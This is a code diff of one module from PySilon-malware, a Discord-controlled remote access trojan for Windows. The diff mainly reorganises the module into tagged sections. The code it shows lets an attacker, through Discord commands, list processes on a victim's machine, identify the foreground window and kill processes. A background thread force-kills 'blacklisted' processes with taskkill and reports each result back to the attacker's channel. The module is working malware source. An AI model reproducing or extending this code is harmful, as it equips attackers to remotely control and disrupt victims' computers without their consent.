@@ -1,3 +1,4 @@
+#<imports>
 from psutil import process_iter, Process
 import resources.modules.misc as pysilon_misc
 import subprocess
@@ -6,10 +7,10 @@ import win32gui
 import asyncio
 import os
 import sys
+import discord
+#</imports>
 
-global processes_list
-processes_list = []
-
+#<commands>
 @client.command(name="tasklist")
 async def list_of_processes(ctx):
     global processes_list
@@ -40,13 +41,6 @@ async def list_of_processes(ctx):
     tasklist_msg = await ctx.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type .kill <process-number>```')
     processes_messages.append(tasklist_msg)
 
-def active_window_process_name():
-    try:
-        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
-        return(Process(pid[-1]).name())
-    except:
-        return None
-
 @client.command(name="foreground")
 async def get_foreground_tast(ctx):
     await ctx.message.delete()
@@ -59,12 +53,6 @@ async def get_foreground_tast(ctx):
         embed = discord.Embed(title=str(foreground_process),description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
-
-def check_int(to_check):
-    try:
-        asd = int(to_check) + 1
-        return True
-    except: return False
 
 @client.command(name="kill")
 async def kill_running_process(ctx, argument=None):
@@ -144,9 +132,6 @@ async def kill_running_process(ctx, argument=None):
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
 
-global embeds_to_send
-embeds_to_send = []
-
 @client.command(name="blacklist")
 async def blacklist_process(ctx, argument=None):
     await ctx.message.delete()
@@ -196,7 +181,9 @@ async def whitelist_process(ctx, argument=None):
             embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
+#</commands>
 
+#<engine>
 def process_blacklister():
     global embeds_to_send
     while True:
@@ -207,20 +194,32 @@ def process_blacklister():
             for process in process_blacklist:
                 if process.lower() in [proc.name().lower() for proc in process_iter()]:
                     stdout = pysilon_misc.force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
-                    #.log Tried to kill provided process
                     time.sleep(1)
                     if process.lower() not in [proc.name().lower() for proc in process_iter()]:
-                        #.log Process is not running anymore 
                         embed = discord.Embed(title="🟢 Success", description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                         embeds_to_send.append([channel_ids['main'], embed])
-                        #.log Sent message about successful kill
                     else:
-                        #.log Process is still running 
                         embed = discord.Embed(title="📛 Error",description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                         embeds_to_send.append([channel_ids['main'], embed])
-                        #.log Sent message about unsuccessfull kill 
         time.sleep(1)
-# !process_blacklister
+
+def active_window_process_name():
+    try:
+        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
+        return(Process(pid[-1]).name())
+    except: return None
+
+def check_int(to_check):
+    try:
+        asd = int(to_check) + 1
+        return True
+    except: return False
+#</engine>
+
+#<start>
+processes_list = []
+embeds_to_send = []
 threading.Thread(target=process_blacklister).start()
+#</start>
